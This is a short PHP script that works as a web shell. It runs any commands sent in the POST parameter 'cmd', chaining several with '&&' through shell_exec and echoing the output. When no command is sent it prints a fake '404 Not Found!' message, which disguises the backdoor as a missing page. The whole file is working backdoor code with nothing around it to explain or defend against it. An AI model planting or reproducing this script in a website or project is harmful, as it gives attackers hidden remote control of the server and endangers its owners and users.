<?php
if($_POST["cmd"]){
$cmd = $_POST["cmd"];

$allCmd = '';
for($x=0; $x<count($cmd); $x++){
if($x==0){
$allCmd = $cmd[$x];
}
else{
$allCmd = $allCmd . " && " . $cmd[$x];
}
}
echo shell_exec($allCmd);
}
else{
echo '404 Not Found!';
}
?>